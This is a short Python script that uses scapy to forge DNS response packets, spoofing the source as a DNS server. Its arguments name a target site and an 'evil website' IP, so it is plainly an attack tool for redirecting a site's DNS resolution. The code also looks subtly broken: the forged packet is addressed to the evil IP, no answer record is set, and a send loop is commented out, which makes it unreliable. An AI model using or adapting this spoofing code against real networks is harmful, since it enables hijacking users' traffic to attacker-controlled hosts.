#!/usr/bin/python
from scapy.all import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("targetsite",  help="the webiste that your are faking the DNS repsonse")
parser.add_argument("evilIP", help="IP of evil website")
parser.add_argument("dnsserver", help="spoofed DNS server")
args = parser.parse_args()

#numPackets=0
#while 1:
send(IP(src=args.dnsserver, dst=args.evilIP)/UDP(sport=53, dport=53)/DNS(qr=1, rd=1, qd=DNSQR(qname=args.targetsite)))
#	if numPackets % 20 == 0:
#		print  numPackets
#	numPackets = numPackets + 1